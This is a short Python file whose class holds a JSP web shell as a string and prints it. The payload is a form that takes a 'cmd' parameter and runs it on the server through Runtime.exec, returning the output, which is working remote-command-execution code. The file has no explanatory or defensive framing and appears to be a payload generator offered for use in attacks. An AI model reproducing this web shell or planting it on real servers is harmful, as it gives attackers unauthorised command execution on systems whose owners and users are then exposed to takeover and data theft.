class jsp_webshell:
    payload = """<FORM METHOD=GET ACTION='{}'>""".format('webshell.jsp') + """
    <INPUT name='cmd' type=text>
    <INPUT type=submit value='Run'>
    </FORM>
    <%@ page import="java.io.*" %>
    <%
   String cmd = request.getParameter("cmd");
   String output = "";
   if(cmd != null) {
      String s = null;
      try {
         Process p = Runtime.getRuntime().exec(cmd,null,null);
         BufferedReader sI = new BufferedReader(new
InputStreamReader(p.getInputStream()));
         while((s = sI.readLine()) != null) { output += s+"</br>---"; }
      }  catch(IOException e) {   e.printStackTrace();   }
   }
%>
<pre><%=output %></pre>"""

if __name__ == '__main__':
    print(jsp_webshell.payload)
